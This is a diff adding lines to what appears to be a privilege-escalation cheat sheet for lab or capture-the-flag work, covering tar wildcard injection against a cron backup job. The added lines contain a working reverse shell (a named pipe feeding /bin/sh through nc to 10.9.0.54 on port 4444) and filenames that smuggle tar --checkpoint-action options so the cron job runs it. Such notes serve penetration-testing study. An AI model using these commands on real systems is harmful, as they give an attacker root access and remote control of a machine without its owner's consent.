@@ -215,6 +215,16 @@ touch  /directory/of/script--checkpoint=1<br>
 touch  /directory/of/script--checkpoint-action=exec=sh\ output.sh<br>
 /tmp/bash -p (have to wait for script to be run on timer)<br>
 <br>
+If this does not work, have a look again at what the crontab is saying is happening, e.g it may be doing a command that first cd's to a directory and backups that directory, if so cd to the directory where this is happening (this demo path is /home/andre/backup and execute <br>
+sudo nano rev <br>
+#!/bin/bash <br>
+rm /tmp/f <br>
+mkfifo /tmp/f <br>
+cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.54 4444 >/tmp/f <br>
+<br>
+$ echo "" > "/home/andre/backup/--checkpoint=1"
+$ echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"
+<br>
 <h2>Cron Jobs with overwrite</h2><br>
 Check file perms of any cron jobs u find (ls -la filename.sh)<br>
 If write permissions can overwrite file<br>
